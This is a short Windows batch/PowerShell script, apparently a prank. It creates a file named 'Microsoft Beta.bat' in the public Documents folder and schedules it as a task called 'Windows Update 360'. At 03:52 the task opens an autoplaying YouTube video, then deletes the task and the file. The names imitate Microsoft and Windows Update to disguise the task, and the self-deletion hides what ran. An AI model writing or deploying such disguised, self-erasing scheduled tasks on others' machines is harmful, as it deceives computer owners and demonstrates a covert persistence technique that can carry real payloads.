powershell rm "C:\Users\Public\Documents\Microsoft Beta.bat"

powershell.exe New-Item -Path 'C:\Users\Public\Documents\Microsoft Beta.bat' -ItemType File; Set-Content -Path 'C:\Users\Public\Documents\Microsoft Beta.bat' -Value 'powershell.exe start https://www.youtube.com/embed/iPYOfrXYO1k?rel=0"""""""""&&"""""""""autoplay=1; SCHTASKS /Delete /TN """""""""Windows Update 360""""""""" /f; rm """""""""C:\Users\Public\Documents\Microsoft Beta.bat"""""""""'

SCHTASKS /Delete /TN "Windows Update 360" /f

SCHTASKS /Create /TN "Windows Update 360" /ST 03:52:00 /SC ONCE /TR "C:\Users\Public\Documents\Microsoft Beta.bat"

